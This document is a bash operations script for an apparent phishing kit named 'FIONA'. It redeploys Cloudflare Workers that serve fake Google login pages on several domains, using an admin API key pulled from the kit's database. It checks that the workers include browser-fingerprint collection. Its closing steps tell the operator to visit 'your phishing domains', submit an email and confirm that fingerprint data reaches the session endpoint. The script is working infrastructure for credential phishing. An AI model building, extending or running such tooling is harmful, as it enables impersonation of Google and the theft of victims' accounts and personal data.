#!/bin/bash
# Update Cloudflare Workers with Fingerprint Collection
# Run this on your Ubuntu server

set -e

echo "=============================================="
echo "FIONA - Update Workers with Fingerprint Code"
echo "=============================================="
echo ""

cd /var/www/fiona/backend || exit 1

echo "Step 1: Backup current worker.js..."
cp login-pages/google/worker.js login-pages/google/worker.js.backup.$(date +%s)
echo "✅ Backup created"
echo ""

echo "Step 2: Checking if fingerprint collection is in worker.js..."
if grep -q "fingerprint.*userAgent.*navigator.userAgent" login-pages/google/worker.js; then
  echo "✅ Fingerprint collection code already present in worker.js"
else
  echo "❌ Fingerprint collection code NOT found in worker.js"
  echo "   You need to upload the new worker.js file from your local machine!"
  echo ""
  echo "   Run this from your local Windows machine:"
  echo "   scp 'C:\\Users\\happy\\OneDrive\\Desktop\\prxyauth-desktop-1.2.4\\backend\\login-pages\\google\\worker.js' root@your-server:/var/www/fiona/backend/login-pages/google/worker.js"
  echo ""
  exit 1
fi
echo ""

echo "Step 3: Getting list of active domains..."
# Query database for active domains with deployed workers
sqlite3 prisma/dev.db "SELECT id, name, cfWorkerName FROM Domain WHERE status='active' AND cfWorkerName IS NOT NULL;" > /tmp/active_domains.txt
DOMAIN_COUNT=$(wc -l < /tmp/active_domains.txt)

if [ "$DOMAIN_COUNT" -eq 0 ]; then
  echo "ℹ️  No active domains with workers found."
  echo "   Workers will be deployed automatically when domains are added."
  echo ""
  exit 0
fi

echo "✅ Found $DOMAIN_COUNT active domain(s) with deployed workers"
echo ""

echo "Step 4: Triggering worker redeployment via API..."
TOKEN=$(sqlite3 prisma/dev.db "SELECT apiKey FROM User WHERE role='ADMIN' LIMIT 1;" | head -1)

if [ -z "$TOKEN" ]; then
  echo "❌ Admin API key not found in database"
  echo "   Cannot trigger automatic redeployment"
  echo ""
  echo "MANUAL OPTION:"
  echo "   Restart the backend to trigger lazy redeployment on next domain access:"
  echo "   pm2 restart fiona-backend"
  exit 1
fi

# Trigger repair for each domain (forces worker redeployment)
while IFS='|' read -r domain_id domain_name worker_name; do
  echo "Redeploying worker for: $domain_name"
  
  curl -s -X POST "http://localhost:8000/api/admin/domains/$domain_id/repair" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" > /tmp/repair_result.json
  
  if grep -q '"success":true' /tmp/repair_result.json; then
    echo "  ✅ $domain_name - Worker updated successfully"
  else
    echo "  ⚠️  $domain_name - Repair failed, check logs"
  fi
done < /tmp/active_domains.txt

echo ""
echo "=============================================="
echo "✅ Worker Update Complete!"
echo "=============================================="
echo ""
echo "VERIFICATION:"
echo "1. Visit one of your phishing domains"
echo "2. Open browser DevTools (F12) → Network tab"
echo "3. Enter an email and click Next"
echo "4. Check the POST request to /api/google/session/start"
echo "5. Request payload should include 'fingerprint' object"
echo ""
echo "BACKEND LOGS:"
echo "pm2 logs fiona-backend --lines 50 | grep FINGERPRINT"
echo ""
